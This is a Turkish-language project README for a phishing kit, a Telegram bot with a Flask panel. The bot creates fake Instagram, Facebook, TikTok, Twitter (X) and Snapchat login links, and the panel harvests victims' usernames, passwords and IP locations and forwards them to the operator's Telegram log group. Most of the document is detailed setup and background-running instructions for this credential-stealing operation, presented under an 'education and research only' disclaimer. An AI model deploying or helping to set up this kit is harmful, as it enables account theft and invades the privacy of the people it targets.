# Telegram Phishing Botu ve Flask Paneli

![Proje Logosu]([https://via.placeholder.com/400x200?text=Telegram+Phishing+Bot](https://github.com/king0din/tgkingphiser/blob/master/image/logo.png?raw=true))

Bu proje, Telegram üzerinden phishing saldırıları düzenlemek için kullanılan gelişmiş bir bot ve bu botun topladığı hassas bilgileri (kullanıcı adı, şifre, IP adresi) güvenli bir şekilde yönetmek için tasarlanmış bir Flask panelinden oluşmaktadır. Proje, eğitim ve güvenlik araştırmaları amacıyla geliştirilmiştir. Yasa dışı veya kötü niyetli amaçlar için kullanılması kesinlikle yasaktır ve bu tür kullanımlardan doğacak sonuçlardan geliştirici sorumlu değildir.

## 🌟 Özellikler

### Telegram Botu

Telegram botu, kullanıcı dostu arayüzü sayesinde çeşitli sosyal medya platformları için özelleştirilmiş phishing linkleri oluşturmanıza olanak tanır. Desteklenen platformlar:

-   **Instagram**: Gerçekçi Instagram giriş sayfası simülasyonu.
-   **Facebook**: Otantik Facebook giriş sayfası simülasyonu.
-   **TikTok**: İkna edici TikTok giriş sayfası simülasyonu.
-   **Twitter (X)**: Yenilenmiş ve modern Twitter (X) giriş sayfası simülasyonu.
-   **Snapchat**: Güncellenmiş ve gerçekçi Snapchat giriş sayfası simülasyonu.
-   **Gmail**: Yakında eklenecek.

Bot, kullanıcıların seçimine göre dinamik olarak özel linkler oluşturur ve bu linkler üzerinden toplanan bilgileri Flask paneline iletir.

### Flask Paneli

Flask paneli, phishing linkleri aracılığıyla elde edilen tüm verileri merkezi bir konumda toplar ve yönetir. Temel işlevleri şunlardır:

-   **Veri Toplama**: Kullanıcı adı, şifre ve IP adresi gibi bilgileri güvenli bir şekilde kaydeder.
-   **IP Bilgisi Sorgulama**: Toplanan IP adreslerinin coğrafi konum (ülke, şehir) ve İnternet Servis Sağlayıcısı (ISP) gibi detaylı bilgilerini otomatik olarak sorgular.
-   **Anlık Bildirimler**: Toplanan tüm bilgileri anında Telegram botuna ve önceden belirlenmiş bir log grubuna göndererek sizi bilgilendirir.

## 🚀 Kurulum

Bu projeyi yerel makinenizde veya bir sunucuda çalıştırmak için aşağıdaki adımları takip edebilirsiniz. Hem Windows hem de Linux işletim sistemleri için ayrıntılı talimatlar verilmiştir.

### 📋 Gereksinimler

-   **Python 3.x**: Proje Python 3.9 ve üzeri sürümlerle uyumludur.
-   **Git**: Proje dosyalarını klonlamak için gereklidir.

### Windows Kurulumu

Windows işletim sisteminde kurulum için aşağıdaki adımları izleyin:

1.  **Python Kurulumu**: Python'ın resmi web sitesinden (python.org) Python 3.x'in en son sürümünü indirin ve kurun. Kurulum sırasında "Add Python to PATH" seçeneğini işaretlediğinizden emin olun.

2.  **Git Kurulumu**: Git'in resmi web sitesinden (git-scm.com) Git'i indirin ve kurun.

3.  **Proje Klonlama**: Komut İstemi'ni (CMD) veya PowerShell'i açın ve aşağıdaki komutu kullanarak projeyi klonlayın:

    ```bash
    git clone https://github.com/king0din/tgkingphiser.git
    cd tgkingphiser
    ```

4.  **Sanal Ortam Oluşturma (Önerilen)**: Proje bağımlılıklarını izole etmek için bir sanal ortam oluşturun ve etkinleştirin:

    ```bash
    python -m venv venv
    .\venv\Scripts\activate
    ```

5.  **Bağımlılıkları Yükleme**: `requirements.txt` dosyasında belirtilen tüm Python kütüphanelerini yükleyin:

    ```bash
    pip install -r requirements.txt
    ```

6.  **Telegram Bot Tokenı ve Log Grup ID'si Ayarlama**:
    -   Telegram'da [BotFather](https://t.me/BotFather) ile yeni bir bot oluşturun ve size verilen bot token'ı kaydedin.
    -   Log bilgilerini göndermek istediğiniz Telegram grubunun sohbet ID'sini (Chat ID) alın. Bunun için botunuzu gruba ekleyip bir mesaj gönderdikten sonra `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates` adresine giderek `chat.id` değerini bulabilirsiniz.

7.  **Yapılandırma Dosyalarını Düzenleme**:
    -   `telegram_bot.py` dosyasını bir metin düzenleyici ile açın ve `BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'` kısmını kendi bot token'ınızla değiştirin.
    -   `flask_app.py` dosyasını açın ve `TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'` ile `LOG_GROUP_CHAT_ID = 'YOUR_LOG_GROUP_CHAT_ID_HERE'` kısımlarını kendi token ve ID bilgilerinizle güncelleyin.

8.  **Uygulamaları Çalıştırma**:
    -   Flask uygulamasını başlatın:

        ```bash
        python flask_app.py
        ```

    -   Yeni bir Komut İstemi/PowerShell penceresi açın, sanal ortamı tekrar etkinleştirin ve Telegram botunu başlatın:

        ```bash
        .\venv\Scripts\activate
        python telegram_bot.py
        ```

    Flask uygulaması genellikle `http://127.0.0.1:8080` adresinde çalışacaktır. Botunuzu çalıştırmak için her iki uygulamanın da aktif olması gerekmektedir.

### Linux Kurulumu

Linux (Ubuntu/Debian tabanlı) işletim sisteminde kurulum için aşağıdaki adımları izleyin:

1.  **Python Kurulumu**: Çoğu Linux dağıtımında Python yüklü olarak gelir. Yüklü değilse veya güncel değilse aşağıdaki komutlarla kurabilirsiniz:

    ```bash
    sudo apt update
    sudo apt install python3 python3-pip
    ```

2.  **Git Kurulumu**: Git'i aşağıdaki komutla kurun:

    ```bash
    sudo apt install git
    ```

3.  **Proje Klonlama**: Terminali açın ve aşağıdaki komutu kullanarak projeyi klonlayın:

    ```bash
    git clone https://github.com/king0din/tgkingphiser.git
    cd tgkingphiser
    ```

4.  **Sanal Ortam Oluşturma (Önerilen)**: Proje bağımlılıklarını izole etmek için bir sanal ortam oluşturun ve etkinleştirin:

    ```bash
    python3 -m venv venv
    source venv/bin/activate
    ```

5.  **Bağımlılıkları Yükleme**: `requirements.txt` dosyasında belirtilen tüm Python kütüphanelerini yükleyin:

    ```bash
    pip install -r requirements.txt
    ```

6.  **Telegram Bot Tokenı ve Log Grup ID'si Ayarlama**:
    -   Telegram'da [BotFather](https://t.me/BotFather) ile yeni bir bot oluşturun ve size verilen bot token'ı kaydedin.
    -   Log bilgilerini göndermek istediğiniz Telegram grubunun sohbet ID'sini (Chat ID) alın. Bunun için botunuzu gruba ekleyip bir mesaj gönderdikten sonra `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates` adresine giderek `chat.id` değerini bulabilirsiniz.

7.  **Yapılandırma Dosyalarını Düzenleme**:
    -   `telegram_bot.py` dosyasını bir metin düzenleyici ile açın ve `BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'` kısmını kendi bot token'ınızla değiştirin.
    -   `flask_app.py` dosyasını açın ve `TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'` ile `LOG_GROUP_CHAT_ID = 'YOUR_LOG_GROUP_CHAT_ID_HERE'` kısımlarını kendi token ve ID bilgilerinizle güncelleyin.

8.  **Uygulamaları Çalıştırma**:
    -   Flask uygulamasını arka planda çalıştırmak için:

        ```bash
        nohup python3 flask_app.py &
        ```

    -   Telegram botunu arka planda çalıştırmak için:

        ```bash
        nohup python3 telegram_bot.py &
        ```

    Uygulamaların arka planda çalıştığından emin olmak için `ps aux | grep python` komutunu kullanabilirsiniz.

## 💡 Kullanım

Telegram botunuzda `/phis` komutunu kullanarak phishing linklerini oluşturabilirsiniz. Kullanıcılar bu linklere tıkladığında, Flask paneli üzerinden giriş bilgileri toplanacak ve size iletilecektir.

## ⚠️ Uyarı

Bu proje yalnızca eğitim ve güvenlik araştırmaları amaçlıdır. Yasa dışı veya kötü niyetli amaçlar için kullanılması kesinlikle yasaktır. Projenin kötüye kullanımından doğacak sonuçlardan geliştirici sorumlu değildir.

## 📄 Lisans

Bu proje MIT Lisansı altında lisanslanmıştır. Daha fazla bilgi için `LICENSE` dosyasına bakın.

---
